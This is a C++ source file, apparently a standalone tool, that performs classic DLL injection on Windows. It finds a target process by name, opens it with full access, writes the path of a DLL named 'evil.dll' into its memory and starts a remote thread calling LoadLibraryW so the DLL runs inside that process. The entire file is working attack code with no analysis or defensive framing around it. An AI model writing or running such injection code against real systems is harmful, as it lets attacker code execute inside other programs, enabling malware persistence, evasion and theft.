// injectDll.cpp 

#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

std::wstring stringToWString(const std::string& s)
{
    std::wstring temp(s.length(), L' ');
    std::copy(s.begin(), s.end(), temp.begin());
    return temp;
}

int main(int argc, char *argv[])
{
    fprintf(stderr, "**** Hello in Classic Dll Injection  ! **** \n");

    HANDLE processHandle;
    PVOID remoteBuffer;
    wchar_t dllPath[] = TEXT("C:\\Temp\\evil.dll");
    struct stat buffer;
    char temp[30];
    std::vector<DWORD> pids;

    sprintf_s(temp, 30, "%ls", dllPath);
    
    if (stat(temp, &buffer) != 0) {
        fprintf(stderr, " C:\\Temp\\evil.dll not found ! \n");
        exit(-1);
    }

    /* STEP 0 : Search pid of target process */

    fprintf(stderr, " **** Searching PID for the processus : %s ****\n", argv[1]);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //snapshot of all processus

    PROCESSENTRY32 currentProcess;
    currentProcess.dwSize = sizeof currentProcess;

    if (!Process32FirstW(snapshot, &currentProcess)) {
        fprintf(stderr, "Process32FirstW fail ! \n");
        exit(-1);
    }

    do {
        if (std::wstring(currentProcess.szExeFile) == stringToWString(argv[1])) {
            pids.emplace_back(currentProcess.th32ProcessID);
            fprintf(stderr, " **** Process find ! pid : %d  , ppid : %d ****\n", currentProcess.th32ProcessID, currentProcess.th32ParentProcessID);
        }
    } while (Process32NextW(snapshot, &currentProcess));

    if (pids.empty()) {
        fprintf(stderr, "**** Process not found ! **** \n");
        exit(-1);
    }

    fprintf(stderr, " **** Injecting DLL to first PID : %i  *****\n", pids[0]);

    /* STEP 1 : Get process handle */

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids[0]); 

    if (processHandle == NULL) {
        fprintf(stderr, "Error processHandle !\n ");
        exit(-1);
    }

    /* STEP 2 : Allocation virtual memory in the target */

    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
   
    if (remoteBuffer == NULL) {
        fprintf(stderr, "Error remoteBuffer !\n ");
        exit(-1);
    }

   /* STEP 3 : Write DLL path to allocated memory & Get address of LoadLibrary */

    WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);


    HMODULE module = GetModuleHandle(TEXT("Kernel32"));

    if (module == 0) {
        fprintf(stderr, "GetModuleHandle error ! \n");
        exit(-1);
    }

    /* STEP 4 : Load the DLL and launch thread for execute the DLL */

    PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(module, "LoadLibraryW");

    if (threatStartRoutineAddress == NULL) {
        fprintf(stderr,"Error threatStartRoutineAddress !\n ");
        exit(-1);
    }

    CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);

    CloseHandle(processHandle);

    fprintf(stderr, "***** GoodBye ! EvIl *****\n");
    return 0;
}

